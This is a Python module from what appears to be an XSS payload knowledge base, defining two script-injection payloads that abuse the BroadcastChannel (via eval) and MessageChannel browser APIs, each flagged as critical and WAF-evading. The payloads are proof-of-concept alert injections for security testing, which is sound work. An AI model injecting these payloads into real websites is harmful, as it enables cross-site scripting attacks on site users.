#!/usr/bin/env python3
"""
Project: BRS-KB (BRS XSS Knowledge Base)
Company: EasyProTech LLC (www.easypro.tech)
Dev: Brabus
Date: 2025-12-26 UTC
Status: Refactored
Telegram: https://t.me/EasyProTech

Messaging API XSS Payloads
"""

from ..models import PayloadEntry


BROADCAST_PAYLOADS = {
    "broadcast_message": PayloadEntry(
        payload="<script>var c=new BroadcastChannel('x');c.onmessage=e=>eval(e.data);c.postMessage('alert(1)')</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="BroadcastChannel eval",
        tags=["broadcast", "channel", "eval"],
        waf_evasion=True,
        reliability="high",
    ),
}

MESSAGE_CHANNEL_PAYLOADS = {
    "message_channel": PayloadEntry(
        payload="<script>var c=new MessageChannel();c.port1.onmessage=e=>alert(e.data);c.port2.postMessage(1)</script>",
        contexts=["html_content"],
        severity="critical",
        cvss_score=8.5,
        description="MessageChannel",
        tags=["message", "channel"],
        waf_evasion=True,
        reliability="high",
    ),
}

# Combined database
MESSAGING_DATABASE = {
    **BROADCAST_PAYLOADS,
    **MESSAGE_CHANNEL_PAYLOADS,
}
MESSAGING_TOTAL = len(MESSAGING_DATABASE)
